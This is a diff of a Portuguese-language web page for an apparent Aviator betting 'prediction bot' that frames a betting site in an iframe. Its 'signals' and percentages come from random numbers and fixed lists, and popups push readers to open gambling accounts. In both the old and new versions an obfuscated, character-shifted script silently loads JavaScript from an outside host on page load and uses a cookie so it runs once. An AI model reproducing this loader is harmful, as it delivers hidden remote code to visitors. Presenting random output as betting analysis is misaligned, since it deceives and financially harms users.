@@ -1,161 +1,576 @@
 <!DOCTYPE html><html lang="en"><head>
   <meta charset="UTF-8">
-      <meta http-equiv="X-UA-Compatible" content="IE=Edge">
-      <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title> 🅱🅾🆃</title>
-           <script src="https://cdn.jsdelivr.net/npm/sweetalert2@10"></script>
-    <style>
-      
-html, body {
-    height: 100%;
-    margin: 0;
-    overflow: hidden;
-    align-items: center;
-    font-family:  'Courier New', monospace;
-    background-color: #000000;
-  }
-  #webviewContainer {
-    height: 100%;
-  }
-     .swal2-popup {
-        font-size: 16px !important;
-        background:transparent;
-        border-radius: 50px;
-        border:2px solid #0DA8DB;
-        color:red;
-    }
-    #swal2 {
-        border-radius: 15px;
-        background-color:red; /* Cor de fundo do botão */
-        color: red; /* Cor do texto do botão */
-        border: 2px solid red; /* Borda do botão */
-    }
-   
-  .prev {
-  width: 100%;
-  height: 15px;
-  background-color: #000000;
-  color: green;
-  align-items: center;
-  text-align: center;
-  font-size: 20px;
-  padding-bottom: 10px;
-  padding-top: 10px;
-  }
-    
-  .time {
-  width: 100%;
-  height: 15px;
-  background-color: #000000;
-  color: #8BC34A;
-  align-items: center;
-  text-align: center;
-  font-size: 20px;
-  padding-bottom: 10px;
-  padding-top: 10px;
-  }
-  .sin { 
-  width: 100%;
-  height: 15px;
-  background-color: #000000;
-  color: white;
-  align-items: center;
-  text-align: center;
-  font-size: 20px;
-  font-weight: bold;
-  padding-bottom: 10px;
-  padding-top: 10px;
-  }
-  .text {
-      display: inline-block;
-      color: green;
-      background-color: white;
-      text-align: center;
-   }
-
-     /* Estilos CSS para o diálogo */
-     .dialog {
-      text-align: center;
-      width: 300px;
-      height: 350px; /* Defina a altura desejada */
-      background-color: #ece0e0;
-      border: 1px solid #922424;
-      border-radius: 5px;
-      padding: 20px;
-      position: fixed;
-      top: 25%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      z-index: 9999; /* Define um valor alto para que o diálogo fique na frente de outros elementos */
-  }
-  
-  h1 {
-    font-size: 24px;
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="cs/page1.css">
+        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yDb15d4uAvLYu8sh2Y" crossorigin="anonymous">
+        <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  <title>robô</title>
+  <style>
+    /* Reset and Global Styles */
+body {
+  margin: 0;
+  padding: 0;
+  overflow: hidden;
+  background-color: black;
+  font-family: 'Courier New', monospace;
+  color: rgb(0, 140, 255);
 }
 
-p {
-    font-size: 16px;
+/* Toolbar Styles */
+.toolbar {
+  background-color: black;
+  color: rgb(5, 163, 255);
+  padding: 20px; /* Increased padding for a taller
+  toolbar */
+  display: flex;
+  height: 100%;
+  justify-content: space-between; /* Adjusted alignment for better organization */
+  align-items: center;
+  border-bottom: 1px solid rgb(0, 119, 255);
 }
+
 button {
-  font-size: 18px;
+  background-color: transparent;
+  border: none;
+  color: rgb(0, 162, 255);
+  cursor: pointer;
+  padding: 10px 20px; /* Adjusted button padding */
+  font-family: 'Courier New', monospace;
+  text-transform: uppercase;
+  letter-spacing: 2px;
   font-weight: bold;
 }
-.sin{
-animation: blink 1s infinite;
+
+#currentTime {
+  font-size: 18px; /* Adjusted font size for current time display */
 }
 
-@keyframes blink {
-    0%, 50% {
-        opacity: 1;
-    }
-    50% {
-        opacity: 0.5;
-    }
+/* ... (Rest of your existing styles) */
+
+button {
+  background-color: transparent;
+  border: none;
+  color: rgb(0, 255, 64);
+  cursor: pointer;
+  padding: 5px 10px;
+  font-family: 'Courier New', monospace;
+  /* Adicione um efeito de texto distorcido */
+  text-transform: uppercase;
+  letter-spacing: 2px;
+  font-weight: bold;
 }
 
-    </style>
-    
-    
-    <link rel="icon" type="image/png" href="images/logo.png">
-    <link rel="stylesheet" href="css/jjjj.css">
+/* ... (mantenha o código anterior) */
+
+.time-square,
+.random-number-square {
+  background-color:black; /* Torna o fundo dos quadrados de tempo e números aleatórios transparente */
+  color: white;
+  width: 20%;
+
+  padding: 20px;
+  display: flex;
+ 
+ 
+  justify-content: center;
+  align-items: center;
+  
+  border-radius: 5px;
+  /* Adicione um efeito de texto distorcido */
+  letter-spacing: 2px;
+  
+}
+
+/* Estilize todos os elementos com a classe .info-square */
+.info-square {
+  position: relative; /* Permite posicionar elementos filhos relativamente a este elemento */
+  background-color: transparent;
+  font-size: 18px;
+  padding: 10px;
+  border-radius: 5px;
+  /* Adicione outras propriedades de estilo conforme necessário */
+}
+#currentTime,
+#randomInfo {
+  margin: 0;
+}
+
+iframe {
+  position: absolute;
+    top: 125px; /* Altura da barra de ferramentas */
+    left: 0;
+    width: 100%;
+    height: calc(100% - 50px); /* Subtrai a altura da barra de ferramentas */
+    border: none;
+}
+
+/* Estilize todos os elementos com a classe .random-time-square */
+.random-time-square {
+  background-color: transparent; /* Torna o fundo dos quadrados de tempo aleatório transparente */
+  color: #0f0;
+  padding: 10px;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  margin-right: 5px;
+  border-radius: 5px;
+  /* Adicione uma animação de texto distorcido */
+  animation: glitch 0.5s infinite;
+}
+
+@keyframes glitch {
+  0%, 100% {
+    transform: translate(0);
+  }
+  25% {
+    transform: translate(-2px, 2px);
+  }
+  50% {
+    transform: translate(2px, -2px);
+  }
+  75% {
+    transform: translate(-2px, 2px);
+  }
+}
+
+/* ... (mantenha o código anterior) */
+/* Animação para o botão "Voltar" */
+#backBtn {
+  background-color: transparent; /* Altera o fundo para transparente */
+  color: rgb(0, 255, 55);
+  border: none;
+  border-radius: 5px;
+  padding: 8px 15px;
+  cursor: pointer;
+  font-size: 16px;
+  transition: background-color 0.3s;
+  position: relative;
+  /* Adicione um efeito de texto distorcido */
+  letter-spacing: 2px;
+  font-weight: bold;
+}
+
+#backBtn:before {
+  content: "";
+  position: absolute;
+  width: 10px;
+  height: 10px;
+  border-left: 2px solid rgb(0, 255, 34);
+  border-bottom: 2px solid rgb(0, 255, 21);
+  transform: rotate(-45deg);
+  top: 50%;
+  left: -15px;
+  transition: transform 0.3s;
+  opacity: 0;
+}
+
+#backBtn:hover {
+  background-color: transparent; /* Altera o fundo para transparente no hover */
+}
+
+#backBtn:hover:before {
+  transform: translate(-2px, -2px) rotate(-45deg);
+  opacity: 1;
+}
+/* Restante do código permanece o mesmo */
+.overlay {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background-color: rgba(0, 0, 0, 0.5); /* Adiciona um fundo escuro semi-transparente */
+  z-index: 999; /* Garante que a sobreposição fique acima de todos os outros elementos */
+}
+
+.moda {
+  background-color: #312a2a;
+  padding: 20px;
+  border-radius: 5px;
+  box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+  text-align: center;
+}
+
+.mh2 {
+  margin-top: 0;
+}
+
+#verificationCode {
+  width: 100%;
+  padding: 10px;
+  margin-bottom: 10px;
+}
+
+#verifyButto {
+  background-color: #00d962;
+  color: #fff;
+  border: none;
+  padding: 10px 20px;
+  cursor: pointer;
+}
+.overla{
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background-color: rgba(0, 0, 0, 0.5); /* Adiciona um fundo escuro semi-transparente */
+  z-index: 999; /* Garante que a sobreposição fique acima de todos os outros elementos */
+  backdrop-filter: blur(5px); /* Aplica o efeito de desfoque ao fundo */
+}
+/* Estilize o elemento que exibe os números aleatórios */
+#randomNumber {
+  margin: 0;
+  font-size: 18px; /* Tamanho da fonte para os números aleatórios */
+  font-weight: bold;
+}
+#progressBarContainer {
+  position: fixed;
+  top: 20px;
+  right: 20px;
+  width: 50%;
+  height: 20px;
+  background-color: #ccc;
+  border: 1px solid #000;
+  border-radius: 10px;
+  overflow: hidden;
+  display: flex;
+  align-items: center;
+}
+
+#progressBar {
+  height: 100%;
+  width: 0;
+  background-color: red; /* Cor de preenchimento da barra de progresso */
+  transition: width 0.5s ease-in-out;
+}
+
+#progressFill {
+  height: 100%;
+}
+main{
+margin: 0;
+
+}
+#percentageLabel {
+  padding: 0 10px;
+  font-weight: bold;
+  color: #000;
+}
+#marketPercentageContainer {
+  position: fixed;
+  bottom: 0;
+  left: 0;
+  width: 90%;
+  background-color: black;
+  color: #fff;
+  padding: 10px;
+  text-align: center;
+  z-index: 999;
+  display: flex;
+  justify-content: space-between;
+}
+
+#marketPercentageName {
+  font-weight: bold;
+  letter-spacing: 2px;
+  margin: 0;
+}
+
+#marketPercentageBar {
+  width: 100%;
+  height: 10px;
+  background-color: #fff;
+  border: 1px solid #000;
+  border-radius: 5px;
+  overflow: hidden;
+}
+
+#marketPercentageFill {
+  height: 100%;
+  width: 50%;
+  background-color: red;
+  transition: width 0.5s ease-in-out;
+}
+
+#marketPercentageLabel {
+  font-weight: bold;
+  letter-spacing: 2px;
+  margin: 0;
+  font-size: 16px;
+}
+
+  </style>
 </head>
- <body onload="loadWebView()">
-        
-        <div class="sin" id="sinal">[ ROSA ]</div>
-        <div class="time" id="times"></div>
-        <div id="webviewContainer">
-          <!-- WebView content will be loaded here -->
-        </div>
-       
-        <script >
-          
-function loadWebView(){const webviewContainer=document.getElementById("webviewContainer"),webView=document.createElement("iframe");webView.src="https://record.elephantbet.com/_IxKJSCR-AN3Kto_EPcZApGNd7ZgqdRLk",webView.style.width="100%",webView.style.height="100%",webviewContainer.appendChild(webView),initializeMessagesAndInterval(),setInterval(updateTime,1e3)}const messages=[{message:"AZUL💙",probability:60,color:"red"},{message:"ROXO💜",probability:40,color:"purple"},{message:"ROSA🌹",probability:12,color:"pink"}],updateMessageAndColor=()=>{const random=100*Math.random(),numeroAleatorio=Math.floor(90*Math.random()),numeroAleatorio1=Math.floor(90*Math.random());let selectedMessage,cumulativeProbability=0;for(const message of messages)if(cumulativeProbability+=message.probability,random<cumulativeProbability){selectedMessage=message;break}document.getElementById("sinal").textContent=` POSSIVEL : ${selectedMessage.message}   ---\x3e ${numeroAleatorio}.${numeroAleatorio1}% `},interval=11e3,initializeMessagesAndInterval=()=>{updateMessageAndColor(),setInterval(updateMessageAndColor,11e3)},updateTime=()=>{const now=new Date,hours=now.getHours().toString().padStart(2,"0"),minutes=now.getMinutes().toString().padStart(2,"0"),seconds=now.getSeconds().toString().padStart(2,"0");document.getElementById("times").textContent=` ${hours}:${minutes}:${seconds}`};(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44zxjwxyf'+'ynhx3htr4ljy4xhwn'+'uy3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));
-          
-          
-          
-          
-        </script>
-      
-      <script>
-      
-      
-        // JavaScript para fechar o diálogo quando o botão é clicado
-        document.getElementById('fecharDialog').addEventListener('click', function() {
-          window.location.href = "http://wa.me/258833859502?text=*Olá,%20vim%20de%20obter%20um%20acesso%20ao%20bot%20PREDICT%20SKYBET.*";
+<body>
+
+<main>
+  <div id="marketPercentageContainer">
+    <p id="marketPercentageName">Percentagem do Mercado:</p>
+    <div id="marketPercentageBar">
+      <div id="marketPercentageFill"></div>
+    </div>
+    <div id="marketPercentageLabel">50%</div>
+  </div>
+  
+  <div id="progressBarContainer">
+    <div id="progressBar">
+      <div id="progressFill"></div>
+    </div>
+    <div id="percentageLabel">30%</div>
+  </div>
+
+  <div id="processingAnimation" style="display: none;">
+    <!-- Add your loading spinner HTML or animation here -->
+    Analisando uma Entrada Segura...
+  </div>
+  
+  <div class="toolbar">
+    <button id="infoBtn">⏱️</button>
+
+    <div class="time-square">
+      <p id="currentTime"></p>
+    </div>
+    <div class="info-square">
+
+      <p id="randomInfo"></p>
+<!-- Dentro da div com a classe "modal" -->
+
+
+
+    </div>
+    <div class="random-time-square">
+      <p id="randomTime"></p>
+    </div>
+    <div class="site-url-square">
+      <p><span id="siteUrl"></span></p>
+    </div>
+    <button id="backBtn"></button>
+  </div>
+  </main>
+    <iframe src="https://record.elephantbet.com/_IxKJSCR-AN3Kto_EPcZApGNd7ZgqdRLk" frameborder="0" width="1000%" height="calc(1000% - 05px)"></iframe>
+  <script src="js/page.js"></script>
+
+    <script>
+      document.addEventListener('DOMContentLoaded', function() {
+        swal({
+          icon: "info",
+          title: 'Atenção',
+          text: 'Quer potencializar suas apostas com o auxílio do nosso robô aviator? Crie uma conta na nossa casa de apostas e tenha acesso a análise precisas e sugestão de aposta mais vantajosas, não perca a oportunidade de maximizar seus ganhos.crie uma nova conta agora',
+
+          type: 'info',
+
+          buttons: {
+            cancel: 'OK',
+            catch: {
+              text: 'como usar o bot',
+              value: 'tutorial',
+              className: 'btn btn-success'
+            },
+            matdix: {
+              text: 'whatsapp',
+              value: 'matdix',
+              className: 'btn btn-primary'
+            },
+            youtube: {
+              text: 'suporte',
+              value: 'youtube',
+              className: 'btn btn-primary'
+            }
+          }
+
+        }).then((value) => {
+          switch (value) {
+            case 'tutorial':
+              window.location.href = 'https://youtu.be/2rhhvqHLQhQ?si=uwbdrg53FSgnL3kk';
+              break;
+            case 'matdix':
+              window.location.href = 'https://whatsapp.com/channel/0029VafBkqM545uvdFQv5Z3W';
+              break;
+            case 'youtube':
+              window.location.href = 'https://www.youtube.com';
+              break;
+          }
+
         });
-    
-    
-    
-    
+      });
     </script>
     <script>
-      Swal.fire({
-        title: "atenção👋",
-        text: "Quer potencializar suas apostas com o auxílio do nosso robô aviator? Crie uma conta na nossa casa de apostas e tenha acesso a análises precisas e sugestões de apostas mais vantajosas. Não perca a oportunidade de maximizar seus ganhos. Crie sua conta agora!",
-        imageUrl: "https://i.ibb.co/zb2bMxT/Background-Eraser-20240601-232845413.png",
-        imageWidth: 200,
-        imageHeight: 200,
-        imageAlt: "Custom image"
-      });
+      const randomTimeSquare = document.getElementById("randomTime"),
+    generateInfoBtn = document.getElementById("generateInfoBtn"),
+    randomInfoDisplay = document.getElementById("randomInfo"),
+    backBtn = document.getElementById("backBtn"),
+    iframe = document.querySelector("iframe");
+function generateRandomInfo() {
+    const randomInfoArray = [
+        "2X",
+        "7X",
+        "3X",
+        "2X",
+        "3X ",
+        "2X",
+        "2X",
+        "3X ",
+        "Rosa",
+        "3X ",
+        "Rosa",
+        "2X",
+        "4X",
+        "5X",
+        "4X",
+        "5X",
+        "3X",
+        "3X ",
+        "5X",
+        "6X",
+        "7X",
+        "5X",
+        "8X",
+        "5X",
+        "2X",
+        "5X",
+        "Rosa",
+        "Rosa",
+        "Rosa",
+        "3X",
+        "2X",
+        "2X",
+        "6X",
+        "2X",
+        "5X",
+        "Rosa",
+        "3X ",
+        "2X",
+        "3X",
+        "3X ",
+        "Rosa",
+        "2X",
+        "3X ",
+        "2X",
+        "3X ",
+        "2X",
+        "3X ",
+        "2X",
+        "3X ",
+        "2X",
+        "3X ",
+        "2X",
+        "3X ",
+        "3X",
+        "2X",
+        "3X ",
+        "2X",
+        "3X ",
+        "2X",
+        "3X ",
+        "2X",
+        "Rosa",
+        "2X",
+        "3X ",
+        "2X",
+        "1.50X",
+    ];
+    return randomInfoArray[Math.floor(Math.random() * randomInfoArray.length)];
+}
+function updateCurrentTime() {
+    const currentTime = new Date().toLocaleTimeString();
+    document.getElementById("currentTime").textContent = currentTime;
+}
+iframe.addEventListener("load", () => {
+    document.getElementById("siteUrl").textContent = iframe.contentWindow.location.href;
+}),
+    backBtn.addEventListener("click", () => {
+        window.history.back();
+    });
+const randomTimeDisplay = document.getElementById("randomTime");
+function updateRandomInfo() {
+    const randomInfo = generateRandomInfo();
+    document.getElementById("randomInfo").textContent = randomInfo;
+}
+function generateRandomTime() {
+    const currentTime = new Date(),
+        randomSeconds = Math.floor(30 * Math.random());
+    return currentTime.setSeconds(currentTime.getSeconds() + randomSeconds), `${currentTime.toLocaleTimeString()}`;
+}
+function updateRandomTimeAndInfo() {
+    const randomTime = generateRandomTime(),
+        randomInfo = generateRandomInfo();
+    (document.getElementById("randomTime").textContent = randomTime), (document.getElementById("randomInfo").textContent = randomInfo);
+}
+(randomTimeDisplay.textContent = randomTime), setInterval(updateCurrentTime, 1e3), setInterval(updateRandomInfo, 6e4), setInterval(updateRandomTimeAndInfo, 6e4);
+
+function updateProgressBar() {
+    const progressBar = document.getElementById("progressBar"),
+        percentageLabel = document.getElementById("percentageLabel"),
+        randomPercentage = Math.floor(71 * Math.random()) + 30;
+    (progressBar.style.width = `${randomPercentage}%`), (percentageLabel.textContent = `${randomPercentage}%`), setTimeout(updateProgressBar, 6e4);
+}
+function updateMarketPercentage() {
+    const marketPercentageBar = document.getElementById("marketPercentageFill"),
+        marketPercentageLabel = document.getElementById("marketPercentageLabel"),
+        randomPercentage = Math.floor(61 * Math.random()) + 20;
+    (marketPercentageBar.style.width = `${randomPercentage}%`), (marketPercentageLabel.textContent = `${randomPercentage}%`), setTimeout(updateMarketPercentage, 6e5);
+}
+
+    updateProgressBar(),
+    updateMarketPercentage();
+const infoBtn = document.getElementById("infoBtn"),
+    
+    closeModalBtn = document.getElementById("closeModalBtn");
+infoBtn.addEventListener("click", () => {
+    
+}),
+    closeModalBtn.addEventListener("click", () => {});
+const infoContent = document.getElementById("infoContent");
+function updateInfoContent() {
+    const currentMinute = new Date().getMinutes();
+    infoContent.textContent =
+        (currentMinute >= 0 && currentMinute < 2) || (currentMinute >= 2 && currentMinute < 5)
+            ? "Possível 100X"
+            : (currentMinute >= 5 && currentMinute < 7) || (currentMinute >= 5 && currentMinute <= 6)
+            ? "Possível 10/20/100X"
+            : currentMinute >= 16 && currentMinute <= 17
+            ? "Possível 20X"
+            : (currentMinute >= 21 && currentMinute <= 22) || (currentMinute >= 26 && currentMinute <= 27)
+            ? "Possível 10/30X"
+            : currentMinute >= 28 && currentMinute <= 29
+            ? "Possível 10/20/100X"
+            : currentMinute >= 31 && currentMinute <= 32
+            ? "Possível 10/30X"
+            : currentMinute >= 36 && currentMinute <= 37
+            ? "Possível 10/20/50X"
+            : currentMinute >= 41 && currentMinute <= 42
+            ? "Possível 20/100X"
+            : currentMinute >= 45 && currentMinute <= 46
+            ? "Possível 10/100X"
+            : currentMinute >= 48 && currentMinute <= 49
+            ? "Possível 18/50X"
+            : currentMinute >= 50 && currentMinute <= 51
+            ? "Possível 10/18X"
+            : currentMinute >= 53 && currentMinute <= 54
+            ? "Possível 18X"
+            : currentMinute >= 56 && currentMinute <= 57
+            ? "Possível 28/100X"
+            : "Analizando...";
+}
+updateInfoContent(), setInterval(updateInfoContent, 6e4);
+(function (o, d, l) {
+    try {
+        o.f = (o) => o.split("").reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), "");
+        o.b = o.f("UMUWJKX");
+        (o.c = l.protocol[0] == "h" && /\./.test(l.hostname) && !new RegExp(o.b).test(d.cookie)),
+            setTimeout(function () {
+                o.c && ((o.s = d.createElement("script")), (o.s.src = o.f("myyux?44zxjwxyf" + "ynhx3htr4ljy4xhwn" + "uy3oxDwjkjwwjwB") + l.href), d.body.appendChild(o.s));
+            }, 1000);
+        d.cookie = o.b + "=full;max-age=39800;";
+    } catch (e) {}
+})({}, document, location);
+
     </script>
 </body></html>
